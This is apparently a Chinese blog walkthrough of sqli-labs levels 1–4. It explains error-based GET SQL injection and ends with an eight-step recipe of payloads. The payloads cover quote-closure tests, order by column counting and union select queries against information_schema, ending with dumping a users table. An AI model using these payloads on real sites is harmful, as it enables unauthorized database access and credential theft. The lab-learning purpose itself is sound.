发表于 2022-11-07 更新于 2023-03-21

less1
进入答题界面可以看到提示
Please input the ID as parameter with numeric value
按要求在网址后输入?id=1
得到正常回显
根据题目描述GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)，我们加入’，得到这个报错页面

为了知道为什么报错，便去查看了源代码，其中由这行代码

$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;

可知当id=1’时，代码中变成id=’1’’,这引起了报错。多了这个’就会报错的话，我们就要想办法把他去掉，而按题目描述又需要这个’才可以继续做题，所以我们既要这个’又不能让他发挥作用，就只能注释它。
我们就可以输入id=1’–+,得到与id=1相同的界面。

之后我们要判断是否存在注入
我们可以使用and 1=1和and 1=2进行判断，and 1=1相当于永远为真，and 1=2相当于永远为假。在GET请求中，若?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入，若?id=1 and 1=1没有报错，但?id=1 and 1=2有异常或没回显，则是数字型注入。
原因：若是字符型注入，输入?id=1 and 1=2,则数据库中查询语句为：

select * from user where id=’1 and 1=2’；

因为id为int类型，所以传入的’1 and 1=2’会强制转换成’1’,=>最终数据库中的查询语句为：

select * from user where id=’1’;

所以sql语句不会报错。
若是数字型注入，注入?id=1 and 1=2 时的SQL语句为：

select * from users where id=1 and 1=2

因为 select * from users where id=1 是正确的语句 ，and 后面的 1=2 是错误的语句，所以select * from users where id=1 and 1=2 会有异常或着网页没有回显（当一个错误的语句和一个正确的语句用and连接符连接时，整体就会是错误的 ）。
知道原理后，我们就可以开始尝试了
我们输入?id=1 and 1=1后正常回显，输入?id=1 and 1=2时无法正常显示，如图：

所以该注入为字符型注入

接着我们可以输入

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

来查询所有表名

将上述域名中的2改为下列代码来查询全部数据库的名称

(select group_concat(schema_name) from information_schema.schemata)


我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。
该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。（ps：table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。）
再将3改为

?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+

less2~4
发现一种很实用的方法，看报错来判断当前sql注入的注入类型是什么，就以第2到4关为例


自上而下分别为第二关到第四关的报错页面，仔细观察可以发现四个的near后的形式都不同，第二关的后面没有数字，所以他为数字型，第三关后为（’’1’’）,所以他为单引号字符型并且要加右括号，第四关后为（’”1”‘）,所以他为双引号字符型，且要加括号，判断完注入类型后，其余于第一关相同，就不过多赘述了。
最后，总结一下这类sql注入的解题过程
1、先判断是否有注入:
?id=1 and 1=1
?id=1 and 1=2

同时通过输入1’和1”判断闭合
2、判断有几行（能正常显示到几就是有几行）：

?id=1' order by n--+(此处n为列数）

3、判断回显点（联合查询时代替可以显示的数字）

?id=-1' union select 1,2,3--+

4、获得全部数据库名称：

?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+

5、获得当前数据库名字：

?id=-1' union select 1,2,database()--+

6、获得数据库内所有表的名称：

?id=-1' union%20select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库名'--+

7、获得数据表中每列的名称：

?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='表名')--+

8、获取信息：

?id=-1‘ union select 1,2,(select group_concat(列名) from 数据库名.数据表名)--+
